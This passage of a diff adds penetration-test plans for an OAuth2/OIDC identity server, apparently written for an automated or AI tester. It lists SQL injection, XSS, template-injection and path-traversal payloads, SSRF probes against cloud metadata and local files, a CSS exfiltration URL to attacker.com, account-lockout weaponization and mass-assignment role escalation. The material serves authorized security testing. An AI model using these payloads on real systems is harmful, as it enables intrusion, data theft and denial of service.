+- Add a nonexistent `user_id` — does the server validate existence?
+- Inject `user_id` values: `../admin`, `" OR "1"="1`, `d7bfa7u6q30ilrocg1lg; DROP TABLE users;--`.
+
+### 3.8 ID Predictability and Enumeration
+
+User / group / session / client IDs use xid. Timestamps and counters are predictable.
+
+- Create 10 users in sequence; observe ID spacing. The counter is deterministic and machine-scoped, so concurrent creators interleave but each counter is monotone.
+- Script enumeration around known IDs to find unlisted resources the admin UI might not surface.
+
+### 3.9 User Deletion Cascade (Confirmed Gaps)
+
+Prior finding: deleting user `test1` left them in their group; the group members endpoint still returned `test1`. Deletion is soft (`deactivated_at`) and doesnt propagate.
+
+**Setup:**
+
+- Create `deltest` with a known password.
+- Add `deltest` to at least one group.
+- Issue tokens for `deltest` through the `pentest-pwgrant` client (access, refresh, id_token).
+- Optionally enroll TOTP via `/account/api/mfa/totp/setup`.
+- Record `user_id`, `group_id`, session `sid`, token `jti`, refresh token.
+
+**Post-deletion matrix** (execute in order, close in time, because access tokens are stateless JWTs and expire at 60 min):
+
+1. **Group membership** — `GET /admin/api/groups/:group_id/members` still shows `deltest`? (confirmed bug; re-verify)
+2. **Sessions** — `GET /admin/api/sessions` still lists `deltest`"s sessions? Cookie still valid at `GET /oauth2/authorize?prompt=none`?
+3. **Access token** — `GET /account/api/profile`, `GET /oauth2/userinfo`, `POST /oauth2/introspect` with the stale token. Introspect must report `active: false` to be correct.
+4. **Refresh token** — `grant_type=refresh_token` with the stale RT. Must fail; any success resurrects the user for 30 days.
+5. **Password grant** — `grant_type=password` with the deleted users credentials. The confirmed `deactivated-grant` finding means this likely still works. Re-verify.
+6. **Audit integrity** — `GET /admin/api/audit-logs` referencing the old `user_id` — does it still resolve, leak nulls, or 500?
+7. **Re-creation collision** — `POST /admin/api/users` with the **same** username and email. Does the new user inherit group memberships (3.9.1)? Do audit logs now reference the new user? Issue a token with `groups` scope and check claims.
+8. **Deletion request cleanup** — submit `POST /account/api/deletion-request` first, then admin-delete the user. Is the pending request orphaned?
+
+### 3.10 Admin Self-Destruction
+
+- `DELETE /admin/api/users/<admin_id>` as the admin. Must be blocked (last admin cannot deactivate themselves) or at least warned. If successful and onboard re-access (Plan 2) doesnt work, the platform has no recovery path.
+- Lockout weaponization: `PUT /admin/api/settings {"account_lockout_max_attempts": "1", "account_lockout_duration": "999999h"}` — one wrong guess = permanent lockout for every user.
+- Password length paradox: `{"validation_min_password_length": "99"}` — existing passwords pre-date the floor; does login still work; can anyone set a new password?
+- Auth mode disruption: `{"auth_mode": "federation"}` with no federation configured — can anyone log in?
+
+### 3.11 Method Discovery on Admin and Account Endpoints
+
+Probe OPTIONS, then unusual methods:
+
+| Endpoint | Methods to try |
+|----------|----------------|
+| `/admin/api/users/:id`                          | PUT, PATCH |
+| `/admin/api/groups/:id`                         | PUT, PATCH, DELETE |
+| `/admin/api/groups/:id/members/:user_id`        | DELETE |
+| `/admin/api/clients/:id`                        | DELETE |
+| `/admin/api/federation/:id`                     | GET, PUT, DELETE |
+| `/admin/api/deletion-requests/:id`              | GET, PUT, POST, DELETE (approval flow) |
+| `/admin/api/audit-logs`                         | DELETE (evidence tampering) |
+| `/account/api/sessions/:id`                     | DELETE |
+| `/account/api/passkeys/:id`                     | DELETE |
+| `/account/api/trusted-devices/:id`              | DELETE |
+| `/account/api/connected-providers/:id`          | DELETE |
+| `/account/api/password`                         | PUT, POST |
+
+Distinguish 404 vs 405 vs 400/401 to infer "not routed" vs "method not allowed" vs "exists but input invalid".
+
+### 3.12 Pagination and Filter Injection
+
+On `/admin/api/audit-logs?limit=20&offset=0`:
+
+- Boundary: `limit=0`, `limit=-1`, `limit=999999999`, `offset=-1`.
+- Type confusion: `limit=abc`, `offset[]=0`, `limit=1.5`.
+- Injection: `limit=20;DROP TABLE--`, `offset=0 OR 1=1`, `offset=(SELECT CASE WHEN 1=1 THEN 0 ELSE 1/0 END)`.
+- Filter additions if any filter params are inferred from responses.
+
+Large values can be a DoS, and SQL errors often leak the database driver.
+
+### 3.13 Admin-Processed Deletion Requests
+
+`/admin/api/deletion-requests` lists pending requests. Look for an approval path (`POST /admin/api/deletion-requests/:id/approve`, `PUT /admin/api/deletion-requests/:id`, etc.).
+
+- Does admin approval cascade correctly (resolves 3.9 gaps)?
+- Can a non-admin with a stolen admin token approve requests?
+- Is there a race between user cancellation (`DELETE /account/api/deletion-request`) and admin approval?
+
+### 3.14 Stale Authorization in Active Tokens
+
+- Add user to admin-like group, issue token with `groups`, remove user from group. Token still carries the group claim until it expires.
+- Change a users role via `PUT /admin/api/users/:id {"role": "user"}`; old admin tokens still work until `exp`.
+- Relying parties MUST NOT rely on JWT claims for time-of-check; document the window explicitly so consumers understand the revocation model.
+
+---
+
+## Execution Notes
+
+- **Test-user hygiene**: `deltest`, `locktest`, `masstest`, `permtest`, `pwtest` — one per class. `locktest` and `deltest` wont be usable again.
+- **Deletion tests (3.9) must run inside the 60-minute access-token lifetime**. Plan the order so tokens are fresh.
+- **Use `pentest-pwgrant`** for scripted token issuance; it avoids browser interactions and gives deterministic RTs to test against.
+- **ID collection**: track `user_id`, `group_id`, `sid`, `jti`, and refresh-token values across setup so post-deletion and cross-user tests remain attributable.
+- **Rollback**: any settings mutation in 3.10 (min password length, lockout weaponization, auth_mode) must be reverted immediately — failure to do so locks the environment.
+- For any 200 response against the admin matrix with a user token, capture the full request / response pair in the report — thats the highest-severity class of finding in this plan.
+```
+
+```
+# Plan 4: Input Validation, Injection, and Mass Assignment
+
+## Goal
+
+Attack every user-controlled input surface — both classic injection (SQL, XSS, template, header, path) and the subtler layer of parameter semantics (mass assignment, type confusion, edge-case parsing, hidden-field injection). Prior testing suggests server-side validation is weak in several directions: the empty `aud` claim, redirect URI permissiveness on DCR, and the profile / settings mass-assignment pattern observed on admin APIs all point to endpoints that accept whatever JSON comes in.
+
+## Context
+
+- Backend: Go with Gorilla toolkit. `html/template` auto-escapes by default, but JSON APIs and audit-log rendering are separate code paths.
+- Database engine is unconfirmed. Use time-based blind payloads when probing: `"; SELECT pg_sleep(5);--` for PostgreSQL, `"; WAITFOR DELAY "0:0:5";--` for SQL Server, `" OR SLEEP(5)--` for MySQL.
+- All admin endpoints are CSRF-exempt (Bearer auth), so the injection surface is open once a token is obtained. The `/onboard` and `/oauth2/login` form endpoints use Gorilla CSRF.
+- Every response carries `X-Request-Id` in xid format (timestamp + machine + counter) — useful for correlating log entries and assessing ID predictability.
+
+## Target Endpoints
+
+| Endpoint | Content-Type | Notes |
+|----------|-------------|-------|
+| `POST /admin/api/users`                      | JSON | username, password, email, role |
+| `PUT  /admin/api/users/:id`                  | JSON | includes verification flags |
+| `POST /admin/api/groups`                     | JSON | name, description |
+| `POST /admin/api/groups/:id/members`         | JSON | user_id |
+| `POST /admin/api/clients`                    | JSON | full client shape |
+| `PUT  /admin/api/clients/:id`                | JSON | client update |
+| `PUT  /admin/api/settings`                   | JSON | all-string flat object |
+| `POST /admin/api/federation`                 | JSON | provider metadata |
+| `POST /oauth2/register`                      | JSON | RFC 7591 metadata |
+| `PUT  /account/api/profile`                  | JSON | profile fields |
+| `POST /account/api/deletion-request`         | JSON | reason |
+| `POST /onboard`                              | form | OAuth2 hidden fields + credentials |
+| `POST /oauth2/login`                         | form | OAuth2 hidden fields + credentials |
+| `GET  /admin/api/audit-logs?limit&offset`    | query | pagination / filters |
+
+---
+
+## Test Areas
+
+### 4.1 SQL Injection
+
+Priority targets (data-writing endpoints):
+
+**`POST /admin/api/users`:**
+- `username`: `admin" OR "1"="1`, `admin"; DROP TABLE users;--`, `admin") UNION SELECT version()--`
+- `email`: `test@test.com" OR 1=1--`
+- `role`: `user" UNION SELECT * FROM users--`
+
+**`POST /admin/api/groups`:**
+- `name`: `group"; SELECT pg_sleep(5);--`
+- `description`: same
+
+**`POST /admin/api/groups/:id/members`:**
+- `user_id`: `" OR "1"="1`, `d7bfa7u6q30ilrocg1lg; DROP TABLE users;--`
+
+**`GET /admin/api/audit-logs`:**
+- `limit=20; DROP TABLE--`
+- `limit=1 UNION SELECT 1,2,3--`
+- `offset=0 OR 1=1`
+- `offset=(SELECT CASE WHEN 1=1 THEN 0 ELSE 1/0 END)`
+
+Look for: DB-driver error strings in responses, time-based blind latency differences, unexpected rows returned.
+
+### 4.2 Stored and Reflected XSS
+
+Inject into fields likely to be rendered in the admin UI:
+
+- `username`: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
+- `email`: `"<script>alert(1)</script>"@test.com`
+- Group `name`: `<svg onload=alert(1)>`
+- Group `description`: `javascript:alert(1)`, `<a href="javascript:alert(1)">`
+- Client `client_name`: `<script>alert(1)</script>`
+- Profile `given_name`, `family_name`, `picture`.
+
+After creation, load the admin UI pages that display these. Also trigger audit-log entries with XSS payloads in actor / target fields — if the admin UI renders audit logs without escaping, this is stored XSS with a cross-privilege blast radius (user-role attacker, admin-role victim).
+
+### 4.3 Template Injection
+
+Go template tokens in fields that might be rendered server-side (email templates, admin UI, static pages):
+
+- `{{.}}` — dumps context.
+- `{{printf "%s" "x"}}`
+- `{{range $k,$v := .}}{{$k}}={{$v}} {{end}}`
+- Alt syntaxes: `${7*7}`, `#{7*7}`, `<%= 7*7 %>`.
+
+Test onboard form fields and any field that surfaces in HTML responses (theme strings, email subject settings, profile display names).
+
+### 4.4 Onboard and Login Hidden Field Injection (Form Paths)
+
+See Plans 1 and 2 for the semantic attacks on `client_id` / `redirect_uri` / `scope` / `code_challenge`. Here the focus is **injection into those fields as input**:
+
+- `GET /onboard?client_id=<script>alert(1)</script>` — does the page echo it unescaped into the HTML form?
+- Submit onboard with `state=\"><script>alert(1)</script>` — reflected into the form re-render on validation error?
+- CRLF in hidden field: `redirect_uri=http://localhost:9999/callback\r\nInjected: true`.
+
+### 4.5 Path Traversal on Resource IDs
+
+- `GET /admin/api/users/../../etc/passwd`
+- `GET /admin/api/users/..%2F..%2Fetc%2Fpasswd`
+- `DELETE /admin/api/users/../admin`
+- `GET /admin/api/groups/..`
+- `GET /admin/api/clients/.%2E%2F`
+
+Look for file reads, distinct error messages vs a non-existent ID, and routing quirks (e.g., the server accepts a traversal path but normalizes it to a different endpoint).
+
+### 4.6 Header Injection
+
+**Host / forwarding headers** — tested in detail in the SSRF / Disclosure plan (issuer poisoning). Here focus on:
+
+- `X-Forwarded-For: 10.0.0.1\r\nInjected: true` — CRLF with log poisoning.
+- `User-Agent` with CRLF — does the session `user_agent` field round-trip it?
+- `Accept-Language: <script>alert(1)</script>` — reflected anywhere?
+
+**Session `ip_address` / `user_agent` reflection**: the `/admin/api/sessions` response shows these fields. Can they be spoofed via `X-Forwarded-For` / `X-Real-IP` / `User-Agent`? Spoofed `ip_address` is itself a finding (audit log integrity).
+
+### 4.7 Audit Log Injection
+
+Perform actions that generate audit entries with payloads in the actor / target names:
+
+- Create a user named `<script>alert("xss")</script>` — check the admin UIs audit log view.
+- Create a group with description carrying a payload.
+- Login with a crafted `User-Agent` that gets logged.
+
+If the UI renders audit logs without escaping: stored XSS from user to admin.
+
+### 4.8 Unicode and Encoding Edge Cases
+
+- Null bytes: `admin\x00evil` in username/email.
+- Homoglyphs: Latin `admin` vs Cyrillic `аdmin` — does collision detection catch it?
+- Email corner cases: `"test"@test.com`, `test@test.com\x00@evil.com`, UTF-8 in local part, quoted-string local part.
+- Overlength: 10k-character username / email / group name / client_name. Confirm `validation_max_*` settings take effect and the server doesnt buffer oversized inputs unsafely.
+- Full-width: `ａｄｍｉｎ` — does normalization happen?
+
+### 4.9 Profile Update Mass Assignment
+
+`PUT /account/api/profile` is documented for `picture`, `given_name`, `family_name`. The underlying user model has many more fields. Test:
+
+- `{"role": "admin"}` / `{"role": "superadmin"}` / `{"role": "Administrator"}`
+- `{"is_email_verified": true}`
+- `{"totp_verified": true}`
+- `{"failed_login_attempts": 0}` (post-lockout reset)
+- `{"deactivated_at": null}` (reactivation)
+- `{"id": "<another_user_id>"}` (ID swap / takeover)
+- `{"created_at": "2020-01-01T00:00:00Z"}` (timestamp confusion)
+- `{"username": "newusername"}` despite `allow_username_change: "false"`
+- `{"email": "newemail@test.com"}` despite `allow_email_change: "false"`
+- Hidden profile fields: `website`, `gender`, `birthdate`, `locale`, `middle_name`, `nickname`, `profile` — even when settings mark each `hidden`.
+
+Read back with `GET /account/api/profile` and `GET /admin/api/users/<id>` to detect silent acceptance.
+
+### 4.10 Admin User Creation Mass Assignment
+
+`POST /admin/api/users` is documented for `username`, `password`, `email`, `role`. Push extras:
+
+```json
+{
+  "username": "masstest",
+  "password": "Masstest123!",
+  "email": "mass@test.com",
+  "role": "user",
+  "is_email_verified": true,
+  "totp_verified": true,
+  "failed_login_attempts": -1,
+  "id": "attacker-controlled-id",
+  "deactivated_at": null,
+  "created_at": "2020-01-01T00:00:00Z"
+}
+```
+
+Then:
+
+- Unknown role values: `"superadmin"`, `""`, `"ADMIN"`, `"Admin"`, `"administrator"` — case sensitivity and canonicalization.
+- Role as array: `["admin", "user"]`.
+- Role as object: `{"admin": true}`.
+
+### 4.11 Settings Value Edge Cases
+
+`PUT /admin/api/settings` is a flat object of string values. The server parses each into durations, integers, and booleans internally.
+
+**Numeric boundaries:**
+
+```json
+{"validation_min_password_length": "0"}
+{"validation_min_password_length": "-1"}
+{"account_lockout_max_attempts": "0"}
+{"account_lockout_max_attempts": "-1"}
+{"account_lockout_max_attempts": "999999999"}
+{"validation_min_username_length": "0"}
+```
+
+After each, test the affected functionality (create a user with a 1-char password, etc.).
+
+**Duration parsing:**
+
+```json
+{"access_token_expiration": "0s"}
+{"access_token_expiration": "-1m"}
+{"access_token_expiration": "1ns"}
+{"access_token_expiration": "999999h"}
+{"sso_session_idle_timeout": "0s"}
+{"refresh_token_expiration": "0s"}
+{"authorization_code_expiration": "999999h"}
+```
+
+Issue a token after each change and inspect `exp`. Zero / negative durations can create tokens that never expire or cause parser crashes.
+
+**Boolean parsing confusion** — Gos `strconv.ParseBool` accepts `1`, `t`, `T`, `TRUE`, `true`, `True`, and their false equivalents. If the server uses a different parser or string equality (`== "true"`), then values like `"1"` or `"TRUE"` fail to enable the setting while possibly appearing enabled in the UI:
+
+```json
+{"require_mfa": "1"}
+{"require_mfa": "yes"}
+{"require_mfa": "TRUE"}
+{"pkce_enforce_s256": "0"}
+{"pkce_enforce_s256": "FALSE"}
+{"allow_self_signup": "1"}
+```
+
+**CORS origin manipulation:**
+
+```json
+{"cors_allowed_origins": "*"}
+{"cors_allowed_origins": "*.example.com"}
+{"cors_allowed_origins": "http://attacker.com, localhost"}
+{"cors_allowed_origins": ""}
+```
+
+After each, send a cross-origin request with `Origin: http://attacker.com` and check the echoed `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`.
+
+**Auth mode tampering:**
+
+```json
+{"auth_mode": ""}
+{"auth_mode": "none"}
+{"auth_mode": "federation"}
+{"auth_mode": "passwordless"}
+```
+
+Confirm login still functions (or is deliberately broken); if invalid modes are accepted silently, login may fall through in surprising ways.
+
+**Unknown key injection:**
+
+```json
+{"debug": "true", "admin_bypass": "true", "secret_key": "test"}
+```
+
+Re-read settings after write — if unknown keys stick, there may be undocumented features altered by writing them.
+
+**Access token audience:**
+
+```json
+{"access_token_audience": "[\"http://localhost:9999\"]"}
+{"access_token_audience": "autentico-admin"}
+{"access_token_audience": "*"}
+```
+
+Issue a token and inspect `aud`. The empty-`aud` bug may be a misconfiguration of this setting.
+
+After every settings change, **restore to the captured original** before moving on.
+
+### 4.12 Client Registration Field Permutations
+
+Both `POST /oauth2/register` (DCR, requires admin Bearer in practice) and `POST /admin/api/clients` (admin API) create clients.
+
+**Public client via DCR** — `token_endpoint_auth_method: "none"` + `grant_types: ["authorization_code"]`: if accepted, no secret is needed to exchange stolen codes.
+
+**Client credentials via DCR** — `grant_types: ["client_credentials"]`. If a secret is returned, use it to request a machine token; then test its reach across the admin API (see 3.3).
+
+**Scope escalation via registration:**
+
+```json
+{"scopes": "openid profile email groups admin offline_access"}
+```
+
+**Password grant via DCR** — `grant_types: ["authorization_code", "password", "refresh_token"]`: self-service creation of a ROPC-capable client = unlimited brute-force channel.
+
+**Post-logout redirect hijack:**
+
+```json
+{"post_logout_redirect_uris": ["http://attacker.example.com/phish"]}
+```
+
+**Duplicate client_id** via admin API: `{"client_id": "autentico-admin", ...}` — overwrite the built-in admin client.
+
+### 4.13 Group Member Field Injection
+
+- `user_id` that doesnt exist — server should reject before insertion; silent insert creates ghost members.
+- Add a deactivated user; then reactivate them — does membership carry over?
+- Add the same user twice — duplicates.
+- Payloads: `../admin`, `" OR "1"="1`, `d7bfa7u6q30ilrocg1lg; DROP TABLE users;--`.
+
+### 4.14 HTTP Parameter Pollution
+
+- Duplicate `redirect_uri` params in `GET /oauth2/authorize`.
+- Duplicate `scope` params.
+- Array-style `user_id[]=a&user_id[]=b` where the server expects a scalar.
+- Duplicate JSON keys: `{"role": "user", "role": "admin"}` — Gos `encoding/json` keeps the last; other parsers vary.
+
+### 4.15 CSS Injection via Settings
+
+If settings accept inline CSS (`theme_css_inline`) or CSS file references (`theme_css_file`):
+
+- `theme_css_inline: "body { background: url("https://attacker.com/exfil?data=") }"` — attribute-value based exfiltration on page load.
+- `theme_css_file: "../../../etc/passwd"` — path traversal / LFI via the theme loader.
+
+### 4.16 Content-Type Confusion
+
+- Send form-encoded body with `Content-Type: application/json` to an admin endpoint — does Gos decoder accept a malformed JSON request body or error cleanly?
+- Send `Content-Type: text/plain` with a JSON body — does the server fall through to raw reads?
+- Send a JSON body with a BOM prefix.
+
+### 4.17 Deletion Request Body Injection
+
+`POST /account/api/deletion-request` body: `{"reason": "..."}`.
+
+- Reason containing HTML / JS (checks admin UI rendering).
+- Reason 100k chars (validation).
+- Extra fields: `{"user_id": "<sole_admin_id>", "reason": "test"}` — overlaps with IDOR in the authorization plan, re-test here.
+
+---
+
+## Execution Notes
+
+- **Dedicated test users**: create `permtest` (profile mass assignment), `masstest1..3` (admin mass assignment), `injtest` (XSS / SQLi). Do not reuse the live admin for mass-assignment probes — a stuck `deactivated_at` or forced `role` flip is hard to reverse.
+- **Settings rollback**: after each 4.11 write, replay a `PUT` with the pre-test snapshot. Keep the snapshot in-memory for the duration of the run.
+- **Detection path for SQLi**: `find_reflected` to see whether payloads surface in responses; otherwise fall back to time-based blind measurement. Track three response-time samples per payload to filter jitter.
+- **Encoding / decoding**: use `encode` and `decode` for URL / base64 / JSON-escape transformations instead of hand-crafting them.
+- **Audit log rendering**: XSS is only useful here if the admin UI actually renders a given field. If direct UI access is limited, consider sending the payload and then asking the user to load the relevant admin page to check execution.
+- **Error-triggered info disclosure**: malformed JSON, wrong content type, invalid field types, oversized bodies, invalid bearer tokens, expired tokens — collect these responses centrally. Even where injection fails, error leakage (stack traces, driver strings, file paths) is a Plan-5 finding.
+```
+
+```
+# Plan 5: SSRF, CORS, and Information Disclosure
+
+## Goal
+
+Map the platforms outbound interaction surface (any field that causes the server to fetch a URL), confirm the browser-cross-origin impact of the wildcard CORS policy, and audit the platform for unnecessary disclosure: debug endpoints, verbose errors, over-scoped API responses, and Host-header poisoning of the OIDC issuer. These three areas are grouped because they share the same kind of attacker goal — pulling data out of, or injecting traffic into, the server through channels that are not the primary request path.
+
+## Context
+
+- All observed responses carry wildcard CORS:
+  ```
+  Access-Control-Allow-Origin: *
+  Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+  Access-Control-Allow-Headers: Content-Type, Authorization
+  ```
+  Applied universally, across OIDC, admin API, and static assets.
+- Security headers are otherwise solid (CSP, X-Frame-Options, COOP, COEP, Permissions-Policy). HSTS is not present; the server ships HTTP.
+- `X-Request-Id` appears on every response in xid format (timestamp + machine + counter).
+- The Go/Gorilla fingerprint is visible via cookie names.
+- Prior findings confirmed wildcard CORS (medium-high) and missing cache-control on admin responses (low-medium).
+
+## Endpoints
+
+**URL-fetching (SSRF surface):**
+
+| Endpoint | Field(s) | Path |
+|----------|----------|------|
+| Federation   | discovery / issuer URL                | `POST /admin/api/federation` |
+| DCR          | `logo_uri`, `client_uri`, `policy_uri`, `tos_uri`, `jwks_uri`, `sector_identifier_uri`, `post_logout_redirect_uris` | `POST /oauth2/register` |
+| Admin clients| same URL fields                       | `POST /admin/api/clients` |
+| Settings     | `theme_logo_url`, `theme_css_file`, `smtp_host`, `favicon_url` | `PUT /admin/api/settings` |
+| Profile      | `picture`                             | `PUT /account/api/profile` |
+| JWT headers  | `jku`, `x5u`                          | any Bearer-auth endpoint |
+
+**Cross-origin read targets:**
+
+| Endpoint | Why it matters |
+|----------|---------------|
+| `/oauth2/token`     | returns access / refresh / id tokens |
+| `/oauth2/userinfo`  | profile claims |
+| `/admin/api/users`  | user list with emails |
+| `/admin/api/settings` | full platform config |
+| `/admin/api/clients`| client registrations, redirect URIs |
+| `/admin/api/sessions` | IPs, user agents |
+
+**Disclosure surface:**
+
+| Endpoint | Notes |
+|----------|-------|
+| `/.well-known/openid-configuration` | OIDC discovery |
+| `/oauth2/.well-known/jwks.json`     | Public keys |
+| `/admin/api/settings`               | 47+ config keys |
+| `/admin/api/stats`                  | Dashboard |
+| `/admin/api/audit-logs`             | Paginated audit |
+| `/admin/docs/`                      | Returned 200 — API docs |
+
+---
+
+## Test Areas
+
+### 5.1 OAST Canary Setup
+
+Create distinct collectors per injection point so callbacks are attributable:
+
+- `oast_create` once per field / endpoint class.
+- Record the canary domain and an internal label (`fed-discovery`, `dcr-logo`, `dcr-jwks`, `theme-logo`, `theme-css`, `smtp`, `profile-picture`, `jwt-jku`, etc.).
+- For redirect-following tests, chain: one collector with `redirect_target` set to a second collector — seeing both get hit confirms the server follows 307s.
+
+### 5.2 Federation Discovery SSRF
+
+- `POST /admin/api/federation` with a new provider whose discovery URL is an OAST canary.
+- Observe whether the server performs a discovery fetch, and whether it parses the returned JSON.
+- If parsing happens, host a crafted discovery document pointing `jwks_uri` or endpoints at internal targets (`http://127.0.0.1:<port>`, `http://169.254.169.254/latest/meta-data/`) to chain into second-order SSRF.
+- Test `file://` scheme acceptance.
+- Test internal addresses wrapped behind the OAST domain (via redirect) — confirms the server resolves and fetches through standard HTTP behavior.
+
+### 5.3 Dynamic Client Registration SSRF
+
+Distinct OAST subdomain per metadata field:
+
+```json
+POST /oauth2/register
+{
+  "client_name": "oast-probe",
+  "redirect_uris": ["http://localhost:9999/callback"],
+  "grant_types": ["authorization_code"],
+  "response_types": ["code"],
+  "logo_uri":              "http://<oast-logo>/l",
+  "client_uri":            "http://<oast-client>/c",
+  "policy_uri":            "http://<oast-policy>/p",
+  "tos_uri":               "http://<oast-tos>/t",
+  "jwks_uri":              "http://<oast-jwks>/j",
+  "sector_identifier_uri": "http://<oast-sector>/s",
+  "post_logout_redirect_uris": ["http://<oast-postlogout>/"]
+}
+```
+
+Monitor OAST for which fields trigger fetches and **when** — registration time, first authorize flow, first token exchange, or admin-UI view.
+
+Trigger later events: start an authorize flow with this client, exchange a token, view the client in the admin panel. Different fields are fetched at different lifecycle moments.
+
+### 5.4 Settings SSRF
+
+- `theme_logo_url`, `theme_css_file`, `favicon_url`, `smtp_host` — set each to its own OAST canary, then trigger the UI pages that use them.
+- `smtp_host` is particularly interesting: a connection attempt can leak SMTP auth credentials if the server tries STARTTLS / AUTH against an attacker host, and SMTP itself is an outbound protocol that can be used to pivot.
+
+### 5.5 Profile `picture` SSRF
+
+- `PUT /account/api/profile` with `picture` → OAST URL.
+- Trigger `/oauth2/userinfo` or any UI page that renders profile picture thumbnails.
+- Some providers server-side fetch `picture` to cache / validate; others pass through the URL to clients.
+
+### 5.6 JWT `jku` / `x5u` Header SSRF
+
+(Also covered in the protocol plan for forgery.) For SSRF specifically:
+
+- Craft a JWT with `jku: "http://<oast>/jwks.json"` and send to any Bearer-auth endpoint.
+- Same with `x5u`.
+- Any OAST callback means the server fetches keys from the header — both an SSRF and an unauthenticated token-forgery vector.
+
+### 5.7 SSRF Escalation
+
+For any confirmed callback:
+
+- Cloud metadata: `http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/computeMetadata/v1/`, `http://100.100.100.200/latest/meta-data/`.
+- Internal services: `http://127.0.0.1:{22,80,443,5432,6379,8080,9000,9999}/`, `http://[::1]:80/`.
+- File scheme: `file:///etc/passwd`, `file:///proc/self/environ`.
+- Gopher: `gopher://127.0.0.1:6379/...` for Redis command injection if ports open.
+- Determine full SSRF (response reflected) vs blind (OAST-only confirmation).
+- DNS rebinding: host a name that resolves to a public IP then swaps to 127.0.0.1 on re-resolution; tests time-of-check-to-time-of-use.
+
+### 5.8 CORS Behavior Verification
+
+- Send requests with varied `Origin`:
+  - `Origin: https://evil.com`
+  - `Origin: null`
+  - `Origin: http://localhost:9999` (baseline)
+  - `Origin: http://localhost:9999.evil.com` (substring trick)
+- Confirm `Access-Control-Allow-Origin: *` is static (not reflected) on each.
+- Check for `Access-Control-Allow-Credentials: true`. Browsers block `*` with credentials, but some servers reflect origin when credentials are present — test by sending a cookie in the request and looking at the response.
+- OPTIONS preflight for `POST /oauth2/token` with form body → simple request, no preflight (the common misunderstanding: this endpoint **is** exploitable cross-origin).
+- OPTIONS preflight for `GET /admin/api/users` with `Authorization: Bearer` → preflight required because of the custom header.
+
+### 5.9 Cross-Origin Attack Chains
+
+Document each concretely:
+
+1. **Auth code leak + token exchange**: `/oauth2/token` accepts form bodies, is a CORS "simple request", and echoes `*`. An attacker page with a leaked code can POST from JS and read the returned tokens. Verify.
+2. **Password grant from any origin**: if the password grant is enabled, any origin can call it and read the response — unlimited cross-origin brute-force with full response visibility.
+3. **Bearer-token exfil**: once a Bearer token is in a victims browser context, the wildcard CORS lets an attacker page read `/admin/api/users`, `/admin/api/settings`, `/admin/api/clients`, `/admin/api/sessions`. Enumerate exactly what data becomes exfiltrable.
+
+### 5.10 Host Header Poisoning
+
+- `GET /.well-known/openid-configuration` with `Host: attacker.example.com` and with `X-Forwarded-Host` / `X-Forwarded-Proto` / `Forwarded`. Inspect whether `issuer`, `authorization_endpoint`, `token_endpoint`, `jwks_uri`, `registration_endpoint`, etc. reflect the spoofed host. A cached / fetched discovery document would then direct relying parties to attacker URLs.
+- Run a full authorize + token flow with a spoofed Host; inspect `iss` in the issued access / ID tokens. A controlled `iss` pointing at an attacker endpoint breaks any relying party that derives JWKS lookup from `iss`.
+- Inspect the login forms `action` attribute and any absolute URLs in HTML responses — a spoofable `action` submits credentials to the attacker.
+
+### 5.11 Debug and Development Endpoints
+
+Probe common Go-ecosystem debug paths:
+
+- `/debug/pprof/`, `/debug/pprof/heap`, `/debug/pprof/goroutine?debug=2`
+- `/debug/vars` (expvar)
+- `/metrics` (Prometheus)
+- `/health`, `/healthz`, `/readyz`, `/livez`
+- `/version`, `/info`, `/build-info`
+- `/swagger/`, `/api-docs/`, `/openapi.json`, `/swagger.json`, `/docs/`
+- `/admin/docs/` (returned 200 — fetch, extract routes and schemas)
+- `/admin/docs/swagger.json`, `/admin/docs/openapi.json`
+- `/.env`, `/config`, `/config.json`, `/config.yaml`, `/secrets.json`
+- `/admin/api/debug`, `/admin/api/health`, `/admin/api/config`
+- `/.git/HEAD`, `/.git/config` (source exposure)
+
+### 5.12 Error Message Leakage
+
+Trigger errors and inspect responses:
+
+- `POST /admin/api/users` with `{invalid`.
+- `POST /admin/api/users` with `Content-Type: text/plain`.
+- `POST /admin/api/users` with `{}` (missing fields).
+- `POST /admin/api/users` with `{"username": 12345}` (type mismatch).
+- 10 MB request body.
+- `Authorization: Bearer notajwt`.
+- `Authorization: Bearer <expired>`.
+- Force a 500 (e.g., trigger the pagination integer overflow from Plan 4).
+
+Look for: stack traces, internal file paths, database drivers/versions, framework version strings, SQL fragments, internal IPs.
+
+### 5.13 OIDC Discovery Review
+
+The discovery document exposes feature support. Review for over-disclosure:
+
+- `grant_types_supported` includes `password` and `client_credentials` — do they need to be advertised?
+- `prompt_values_supported` includes `create` despite `allow_self_signup: "false"`.
+- `request_parameter_supported: false` — good, JAR is off.
+- `registration_endpoint` is advertised — anyone discovering the server learns DCR is available.
+
+If the system doesnt rely on these features for an external relying party, removing them from discovery reduces attack-surface visibility.
+
+### 5.14 Response Header Consistency
+
+- `Cache-Control: no-store` — confirmed on `/oauth2/token`. Audit the admin API: prior finding flagged missing Cache-Control on admin responses. Re-run and document every endpoint that still lacks it.
+- `Pragma: no-cache`.
+- `Strict-Transport-Security` — missing.
+- `Content-Type` correctness across endpoints (no `text/html` on JSON responses).
+- `X-Content-Type-Options: nosniff`, `Referrer-Policy`.
+
+### 5.15 X-Request-Id Analysis
+
+`X-Request-Id` in xid format. Extract:
+
+- Timestamp → server clock disclosure.
+- Machine ID component → infrastructure fingerprint.
+- Counter → predictability, useful for enumeration attacks in the authorization plan.
+
+Request hundreds of IDs rapidly; analyze spacing to understand the counters domain.
+
+### 5.16 Token Claim Review
+
+Access token carries `email`, `email_verified`, `preferred_username`, `name`, `sid`. Every admin-API request ships this PII.
+
+### 5.17 Client Secret Exposure
+
+Check `/admin/api/clients`:
+
+- Do list responses include `client_secret`?
+- Do detail responses include it, or only at creation time?
+- Does updating a client return the secret?
+- DCR response: does it return the secret once and store an opaque reference, or echo it on subsequent `GET`?
+
+### 5.18 Audit Log Completeness
+
+Perform the following and verify each appears in `/admin/api/audit-logs`:
+
+- Login success, login failure, lockout.
+- User create / modify / delete.
+- Group create / modify / membership change.
+- Client create / modify / delete / DCR.
+- Settings change (which keys? a summary or full diff?).
+- Token revocation.
+- MFA enrollment, verification, disable.
+- Session termination.
+- Federation provider add / remove.
+
+Missing events = gaps in forensic response. `audit_log_retention: "0"` needs clarification (unlimited vs disabled).
+
+### 5.19 Sensitive Data in URLs
+
+- Auth codes appear in callback URLs (expected; confirm short lifetime).
